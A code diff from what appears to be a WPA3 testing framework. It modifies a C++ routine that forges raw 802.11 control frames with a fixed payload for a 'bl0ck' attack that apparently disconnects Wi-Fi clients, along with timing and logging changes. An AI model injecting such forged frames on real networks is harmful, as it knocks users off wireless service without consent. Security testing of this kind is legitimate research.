@@ -16,26 +16,26 @@ namespace wpa3_tester::bl0ck_attack{
     using namespace Tins;
     using namespace chrono;
 
-    RadioTap get_bl0ck_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw,const int subtype) {
-
-        Dot11Data frame;
+    RadioTap get_bl0ck_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw, const int subtype) {
+        Dot11 frame;
         frame.type(Dot11::CONTROL);
         frame.subtype(subtype);
+        frame.addr1(ap_hw); // Receiver Address (RA)
 
-        frame.addr1(ap_hw);   // Receiver
-        frame.addr2(sta_hw);  // Transmitter
+        vector addr2_bytes(sta_hw.begin(), sta_hw.end());
 
-        // 3. Payload (přidáme jako RawPDU na konec 802.11 hlavičky)
         const vector<uint8_t> payload_data = {
             0x04, 0x00, 0x74, 0x49, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
             0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
             0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
             0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
         };
-        frame /= RawPDU(payload_data);
-        RadioTap bl0ck_frame = RadioTap() / frame;
-        return bl0ck_frame;
+        // TODO v python script je prázdná hlavička, je nutné ji mít prázdnou
+        // RadioTap() <- dá tam něco defaultně
+        const RadioTap rt{};
+        return  rt / frame / RawPDU(addr2_bytes) / RawPDU(payload_data);
     }
+
 
     void block(const string& STA_mac,
                const string& AP_mac,
@@ -106,18 +106,18 @@ namespace wpa3_tester::bl0ck_attack{
             }*/
             throw not_implemented_error("Unsupported attack type");
         }
-        this_thread::sleep_for(seconds(30));
+        this_thread::sleep_for(seconds(duration+5));
         log(LogLevel::INFO, "Block Attack END");
     }
 
     void stats_bl0ck_attack(const RunStatus& rs){
         log(LogLevel::INFO , "Bl0ck attack stats");
-        const vector<LogTimePoint> disconn_events = get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED");
+        //const vector<LogTimePoint> disconn_events = get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED");
 
         vector<observer::graph_lines> events;
-        events.push_back({disconn_events,"DISCONN", "red"});
+        //events.push_back({disconn_events,"DISCONN", "red"});
 
         const string STA_graph_path = observer::tshark_graph(rs, "attacker", events);
-        log(LogLevel::CRITICAL, "Bl0ck attack stop");
+        log(LogLevel::INFO, "Bl0ck attack stop");
     }
 }
